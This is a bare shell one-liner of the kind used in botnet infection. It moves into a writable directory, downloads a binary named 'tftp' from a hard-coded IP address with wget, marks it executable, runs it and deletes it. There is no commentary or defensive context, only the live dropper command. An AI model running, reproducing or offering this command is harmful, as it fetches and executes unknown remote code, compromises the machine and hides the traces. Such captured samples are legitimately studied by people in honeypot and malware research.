cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.73.147.5/tftp; chmod +x tftp; ./tftp; rm -rf tftp
